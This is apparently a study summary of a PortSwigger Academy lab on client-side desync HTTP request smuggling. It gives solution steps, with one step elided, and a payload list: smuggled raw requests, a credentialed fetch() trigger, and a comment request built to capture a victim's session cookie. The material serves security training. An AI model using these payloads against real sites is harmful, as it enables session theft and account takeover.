# Lab: Client-side desync

**Official lab:** [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## Lab idea

This browser-powered exercise concerns a server that ignores Content-Length on certain endpoints. It practices identifying a client-side desynchronization condition and understanding how a victim browser’s own connection and session data may be affected.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Notice that requests to / result in a redirect to /en .
2. Send the GET / request to Burp Repeater.
3. In Burp Repeater, use the tab-specific settings to disable the Update Content-Length option.
4. Convert the request to a POST request (right-click and select Change request method ).
- …
6. Refresh the blog post and confirm that you have captured the start of the victim user's request.
7. Repeat this attack, adjusting the Content-Length of the nested POST /en/post/comment request until you have successfully output the victim's session cookie.
8. In Burp Repeater, send a request for /my-account using the victim's stolen cookie to solve the lab.

## Payloads / key values
- `/`
- `/en`
- `GET /`
- `POST`
- `Content-Length`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.h1-web-security-academy.net Connection: close Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x`
- `Connection`
- `keep-alive`
- `fetch()`
- `fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', { method: 'POST', body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', mode: 'cors', credentials: 'include', }).catch(() => { fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', { mode: 'no-cors', credentials: 'include' }) })`
- `catch()`
- `GET /en/post?postId=x`
- `postId`
- `session`
- `_lab_analytics`
- `csrf`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.h1-web-security-academy.net Connection: keep-alive Content-Length: CORRECT POST /en/post/comment HTTP/1.1 Host: YOUR-LAB-ID.h1-web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE Content-Length: NUMBER-OF-BYTES-TO-CAPTURE Content-Type: x-www-form-urlencoded Connection: keep-alive csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=`
- `GET /capture-me HTTP/1.1 Host: YOUR-LAB-ID.h1-web-security-academy.net`
- `POST /en/post/comment`
- `GET /capture-me`
- `/capture-me`
- `/my-account`

## Official source
- [PortSwigger Academy: Lab: Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
